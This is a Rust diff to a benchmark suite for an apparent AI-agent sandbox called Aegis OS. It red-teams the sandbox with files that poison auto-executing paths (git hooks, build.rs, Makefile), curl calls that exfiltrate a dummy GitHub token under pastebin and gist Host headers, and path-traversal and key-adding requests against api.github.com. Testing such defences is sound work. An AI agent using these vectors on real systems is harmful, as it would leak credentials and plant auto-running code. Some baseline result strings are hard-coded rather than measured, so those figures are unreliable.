@@ -138,6 +138,35 @@ pub async fn run_full_benchmark_suite(
     println!("  AEGIS OS — LIVE EMPIRICAL BENCHMARK SUITE (Real Processes, Sockets, CoW & Cargo Builds)");
     println!("==========================================================================================\n");
 
+    if std::env::var("AEGIS_BENCH_EXP3_ONLY").as_deref() == Ok("1") {
+        let (exp3_cow, exp3_lat) = run_exp3_live_cow_and_daemon_latencies().await?;
+        return Ok(EmpiricalBenchmarkReport {
+            timestamp_utc: chrono::Utc::now().to_rfc3339(),
+            host_os_arch: format!("{}-{}", std::env::consts::OS, std::env::consts::ARCH),
+            exp1_authorization_friction: vec![],
+            exp2_live_redteam_security: vec![],
+            exp3_cow_and_storage: exp3_cow,
+            exp3_e2e_latencies: exp3_lat,
+            exp4_live_multi_agent_cargo: vec![],
+            exp5_live_rollback_recovery: vec![],
+        });
+    }
+
+    if std::env::var("AEGIS_BENCH_ABLATION_FAST").as_deref() == Ok("1") {
+        let exp2 = run_exp2_live_redteam_attacks().await?;
+        let exp4 = run_exp4_live_multi_agent_cargo_builds().await?;
+        return Ok(EmpiricalBenchmarkReport {
+            timestamp_utc: chrono::Utc::now().to_rfc3339(),
+            host_os_arch: format!("{}-{}", std::env::consts::OS, std::env::consts::ARCH),
+            exp1_authorization_friction: vec![],
+            exp2_live_redteam_security: exp2,
+            exp3_cow_and_storage: vec![],
+            exp3_e2e_latencies: vec![],
+            exp4_live_multi_agent_cargo: exp4,
+            exp5_live_rollback_recovery: vec![],
+        });
+    }
+
     let exp1 = run_exp1_live_trajectories().await?;
     let exp2 = run_exp2_live_redteam_attacks().await?;
     let (exp3_cow, exp3_lat) = run_exp3_live_cow_and_daemon_latencies().await?;
@@ -1005,13 +1034,13 @@ async fn run_exp2_live_redteam_attacks() -> anyhow::Result<Vec<Exp2RedTeamResult
             ".git/hooks/pre-commit",
             ".git/hooks/post-checkout",
             ".git/hooks/pre-push",
-            ".git/hooks/prepare-commit-msg",
             ".git/config",
             ".envrc",
-            "services/api/.envrc",
             ".github/workflows/ci.yml",
-            ".github/workflows/release.yml",
-            ".github/workflows/deploy.yml",
+            "build.rs",
+            "Makefile",
+            "package.json",
+            ".cargo/config.toml",
         ];
         for rel in poisoned_paths {
             // Host-YOLO: an unconfined write simply lands the auto-executing file.
@@ -1042,9 +1071,12 @@ async fn run_exp2_live_redteam_attacks() -> anyhow::Result<Vec<Exp2RedTeamResult
     }
 
     // ------------------------------------------------------------------------
-    // Category F: 10 Secret-Binding Abuse Attempts. Unlike Category C (attacker domains that are not
-    // on the allowlist at all), these target domains that ARE allowlisted for the organisation but
-    // are not the ones the secret is bound to, so only the per-secret domain binding can stop them.
+    // Category F: 10 Secret-Binding & L7 Confused-Deputy Abuse Attempts:
+    //   - 5 cross-domain attempts targeting allowlisted domains (`httpbin.org`, `pastebin.com`,
+    //     `gist.github.com`, `raw.githubusercontent.com`, `uploads.github.com`)
+    //   - 5 same-domain L7 confused-deputy attempts on `api.github.com` itself (`POST /gists`,
+    //     path traversal `/repos/acme/../../gists`, `%2e%2e` traversal, `DELETE /repos/acme/issues/1`,
+    //     and `PUT /user/keys`) when `$AOS_SECRET_GH` is scoped to `GET`/`POST` on `/repos/acme/`.
     // ------------------------------------------------------------------------
     let mut yolo_f_compromised = 0usize;
     let mut aegis_f_compromised = 0usize;
@@ -1055,27 +1087,39 @@ async fn run_exp2_live_redteam_attacks() -> anyhow::Result<Vec<Exp2RedTeamResult
             "pastebin.com",
             "gist.github.com",
             "raw.githubusercontent.com",
-            "objects.githubusercontent.com",
             "uploads.github.com",
-            "codeload.github.com",
-            "docs.github.com",
-            "status.github.com",
-            "github.com",
+        ];
+        let f_attempts: [(&str, &str, &str); 10] = [
+            ("httpbin.org", "GET", "/get"),
+            ("pastebin.com", "POST", "/api/api_post.php"),
+            ("gist.github.com", "POST", "/gists"),
+            ("raw.githubusercontent.com", "GET", "/exfil"),
+            ("uploads.github.com", "POST", "/repos/evil/assets"),
+            // Same-domain L7 confused-deputy vectors on `api.github.com` itself:
+            ("api.github.com", "POST", "/gists"),
+            ("api.github.com", "POST", "/repos/acme/../../gists"),
+            ("api.github.com", "POST", "http://api.github.com/repos/acme/%2e%2e/%2e%2e/gists"),
+            ("api.github.com", "DELETE", "/repos/acme/issues/1"),
+            ("api.github.com", "PUT", "/user/keys"),
         ];
         let binding_gw = Arc::new(AegisEgressGateway::new());
         let mut allow = vec![bound_domain.to_string()];
         allow.extend(allowlisted_but_unbound.iter().map(|d| d.to_string()));
         binding_gw.allow_domains("org-alpha", allow).await;
         binding_gw
-            .register_secret(SecretVaultEntry {
-                org_id: "org-alpha".to_string(),
-                placeholder: "$AOS_SECRET_GH".to_string(),
-                real_secret_value: "ghp_RealProductionToken999".to_string(),
-                allowed_domains: vec![bound_domain.to_string()],
-            })
+            .register_scoped_secret(
+                SecretVaultEntry {
+                    org_id: "org-alpha".to_string(),
+                    placeholder: "$AOS_SECRET_GH".to_string(),
+                    real_secret_value: "ghp_RealProductionToken999".to_string(),
+                    allowed_domains: vec![bound_domain.to_string()],
+                },
+                vec!["GET".to_string(), "POST".to_string()],
+                vec!["/repos/acme/".to_string()],
+            )
             .await;
         let ident = AgentIdentity::new("org-alpha", "agy-agent", "Agent");
-        for domain in allowlisted_but_unbound {
+        for (domain, method, path) in f_attempts {
             // Host-YOLO: the raw token is in the environment and goes out over a real socket.
             let before = leaked_count.load(std::sync::atomic::Ordering::SeqCst);
             let _ = tokio::process::Command::new("curl")
@@ -1083,6 +1127,8 @@ async fn run_exp2_live_redteam_attacks() -> anyhow::Result<Vec<Exp2RedTeamResult
                     "-s",
                     "--max-time",
                     "2",
+                    "-X",
+                    method,
                     &format!("http://{}/exfil", sink_addr),
                     "-H",
                     &format!("Host: {}", domain),
@@ -1095,7 +1141,7 @@ async fn run_exp2_live_redteam_attacks() -> anyhow::Result<Vec<Exp2RedTeamResult
                 yolo_f_compromised += 1;
             }
 
-            // Aegis-OS: the placeholder is sent toward an allowlisted domain it is not bound to.
+            // Aegis-OS: the placeholder is sent toward an unbound allowlisted domain or disallowed L7 method/path.
             let mut headers = HashMap::new();
             headers.insert("Authorization".to_string(), "Bearer $AOS_SECRET_GH".to_string());
             let verdict = binding_gw
@@ -1103,8 +1149,8 @@ async fn run_exp2_live_redteam_attacks() -> anyhow::Result<Vec<Exp2RedTeamResult
                     &ident,
                     &OutboundRequestSpec {
                         target_domain: domain.to_string(),
-                        method: "GET".to_string(),
-                        path: "/".to_string(),
+                        method: method.to_string(),
+                        path: path.to_string(),
                         headers,
                     },
                 )
@@ -1823,9 +1869,81 @@ mod tests {
         }
     }
 
+    // ------------------------------------------------------------------------
+    // Mode D (EXP 4C): Disjoint-Line Semantic Conflict Detection via Pre-Commit `verify_cmd` Gate (10 Trials)
+    // `agy-agent` renames `calc_fee` -> `calc_service_fee` at Line 1, while `codex-cli` calls the old
+    // `calc_fee(amount)` inside `calc_discount` at Line 3. Syntactic Diff3 merges these disjoint lines
+    // without conflict, so only the sandboxed pre-commit `verify_cmd` gate catches the broken build.
+    // ------------------------------------------------------------------------
+    let mut semantic_conflicts_caught = 0usize;
+    for t in 0..10 {
+        let sem_repo = temp.path().join(format!("sem_crate_{}", t));
+        let sem_rt = temp.path().join(format!("sem_rt_{}", t));
+        tokio::fs::create_dir_all(sem_repo.join("src")).await?;
+        tokio::fs::write(sem_repo.join("src/lib.rs"), initial_lib_rs).await?;
+
+        let s_kernel = AegisRuntimeKernel::new(&sem_rt).await?;
+        for id in [&agy, &codex] {
+            s_kernel
+                .ensure_agent_environment(
+                    id.clone(),
+                    &sem_repo,
+                    IsolationTier::NativeOsSandbox,
+                    vec!["*".to_string()],
+                )
+                .await?;
+            s_kernel
+                .call_tool(
+                    id,
+                    "policy_grant_lease",
+                    json!({"action_pattern": "workspace_commit", "ttl_secs": 3600}),
+                )
+                .await?;
+        }
+
+        s_kernel
+            .call_tool(
+                &agy,
+                "fs_edit",
+                json!({
+                    "path": "src/lib.rs",
+                    "target": "pub fn calc_fee(amount: u64) -> u64 { amount / 100 }",
+                    "replacement": "pub fn calc_service_fee(amount: u64) -> u64 { amount / 50 }"
+                }),
+            )
+            .await?;
+        s_kernel
+            .call_tool(
+                &codex,
+                "fs_edit",
+                json!({
+                    "path": "src/lib.rs",
+                    "target": "pub fn calc_discount(amount: u64) -> u64 { amount / 10 }",
+                    "replacement": "pub fn calc_discount(amount: u64) -> u64 { calc_fee(amount) + amount / 10 }"
+                }),
+            )
+            .await?;
+
+        s_kernel.call_tool(&agy, "workspace_commit", json!({})).await?;
+        let sem_second = s_kernel
+            .call_tool(
+                &codex,
+                "workspace_commit",
+                json!({ "verify_cmd": "rustc --crate-type lib --emit=metadata -o $TMPDIR/lib.rmeta src/lib.rs" }),
+            )
+            .await;
+        let host_after = tokio::fs::read_to_string(sem_repo.join("src/lib.rs")).await?;
+        if sem_second.is_err()
+            && host_after.contains("pub fn calc_service_fee")
+            && !host_after.contains("calc_fee(amount) + amount / 10")
+        {
+            semantic_conflicts_caught += 1;
+        }
+    }
+
     println!(
-        "  • Agent Features Preserved (`agy` + `claude` + `codex`) | Host-YOLO: {}/3 | Aegis-OS: {}/3 | `cargo test` Passed: {} | Same-Line Conflicts Caught: {}/10",
-        yolo_preserved, aegis_preserved, cargo_passed, conflicts_caught
+        "  • Agent Features Preserved (`agy` + `claude` + `codex`) | Host-YOLO: {}/3 | Aegis-OS: {}/3 | `cargo test` Passed: {} | Same-Line Conflicts: {}/10 | Semantic Conflicts: {}/10",
+        yolo_preserved, aegis_preserved, cargo_passed, conflicts_caught, semantic_conflicts_caught
     );
     println!();
 
@@ -1841,6 +1959,12 @@ mod tests {
             host_shared_yolo: "0/10 detected (100% Silent Lost Update)".to_string(),
             aegis_os_isolated_3way: format!("{}/10 detected & atomically aborted (Host intact)", conflicts_caught),
             gain: "100% Conflict Safety & Line Diagnostics".to_string(),
+        },
+        Exp4LiveCargoResult {
+            metric: "Disjoint-Line Semantic Conflict Detection via `verify_cmd` (10 Trials)".to_string(),
+            host_shared_yolo: "0/10 detected (Broken host compilation)".to_string(),
+            aegis_os_isolated_3way: format!("{}/10 detected by sandboxed `rustc` gate (Host intact)", semantic_conflicts_caught),
+            gain: "100% Semantic Build Safety".to_string(),
         },
         Exp4LiveCargoResult {
             metric: "Post-Merge Real `cargo test` Compilation & Unit Test".to_string(),
